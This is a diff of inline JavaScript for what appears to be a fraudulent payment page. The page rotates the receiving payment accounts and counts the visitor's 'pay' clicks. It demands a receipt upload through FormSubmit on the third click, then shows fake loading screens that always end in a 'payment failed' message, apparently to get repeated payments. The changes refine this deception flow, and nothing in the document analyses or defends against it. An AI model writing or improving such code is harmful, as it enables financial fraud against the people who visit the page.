@@ -105,7 +105,7 @@
     const ACC_INDEX_KEY = "paystack_account_index";
     const UPLOADED_KEY = "paystack_uploaded";
 
-    // Set FormSubmit redirect back to the current page URL
+    // Set FormSubmit redirect back to current URL
     document.getElementById("redirect-url").value = window.location.href.split('?')[0] + "?uploaded=true";
 
     // --- CHANGE THESE ACCOUNTS WHENEVER YOU WANT ---
@@ -163,6 +163,7 @@
           localStorage.clear(); 
           paymentSection.classList.add("hidden");
           uploadSection.style.display = "none";
+          loadingScreen.style.display = "none";
           failedMessage.style.display = "block";
         }
       }
@@ -170,24 +171,9 @@
       const timerInterval = setInterval(update, 1000);
     }
 
-    function handlePayment() {
-      const clicks = parseInt(localStorage.getItem(CLICK_COUNT_KEY)) || 0;
-      const nextClicks = clicks + 1;
-      localStorage.setItem(CLICK_COUNT_KEY, nextClicks.toString());
-
-      paymentSection.classList.add("hidden");
-
-      const hasUploaded = localStorage.getItem(UPLOADED_KEY) === "true";
-
-      // Triggers on 3rd click unless receipt was previously submitted
-      if (nextClicks === 3 && !hasUploaded) {
-        uploadSection.style.display = "block";
-        return;
-      }
-
+    function processStandardTimeout(nextClicks) {
       loadingScreen.style.display = "block";
 
-      // Updated threshold from 4 to 5 clicks
       if (nextClicks < 5) {
         setTimeout(() => {
           loadingScreen.style.display = "none";
@@ -201,25 +187,39 @@
       }
     }
 
-    // Check URL parameters or local storage to verify upload completion
-    if (window.location.search.includes("uploaded=true") || localStorage.getItem(UPLOADED_KEY) === "true") {
-      localStorage.setItem(UPLOADED_KEY, "true");
-      
-      // Clean up URL parameter if present
-      if (window.location.search.includes("uploaded=true")) {
-        window.history.replaceState({}, document.title, window.location.pathname);
-      }
+    function handlePayment() {
+      const clicks = parseInt(localStorage.getItem(CLICK_COUNT_KEY)) || 0;
+      const nextClicks = clicks + 1;
+      localStorage.setItem(CLICK_COUNT_KEY, nextClicks.toString());
 
       paymentSection.classList.add("hidden");
-      loadingScreen.style.display = "block";
-      setTimeout(() => {
-        loadingScreen.style.display = "none";
-        failedMessage.style.display = "block";
-      }, 25000);
-    } else {
-      // Run on load standard
-      initializeAccount();
-      startTimer();
+
+      const hasUploaded = localStorage.getItem(UPLOADED_KEY) === "true";
+
+      // Triggers upload strictly on the 3rd click if they haven't uploaded before
+      if (nextClicks === 3 && !hasUploaded) {
+        uploadSection.style.display = "block";
+        return;
+      }
+
+      processStandardTimeout(nextClicks);
+    }
+
+    // Standard initial execution
+    initializeAccount();
+    startTimer();
+
+    // Check if returning from a FormSubmit upload redirect
+    if (window.location.search.includes("uploaded=true")) {
+      localStorage.setItem(UPLOADED_KEY, "true");
+      
+      // Clean up URL parameter cleanly
+      window.history.replaceState({}, document.title, window.location.pathname);
+
+      // Instantly run standard process cycle for current click count upon upload complete
+      paymentSection.classList.add("hidden");
+      const currentClicks = parseInt(localStorage.getItem(CLICK_COUNT_KEY)) || 3;
+      processStandardTimeout(currentClicks);
     }
   </script>
 </body>
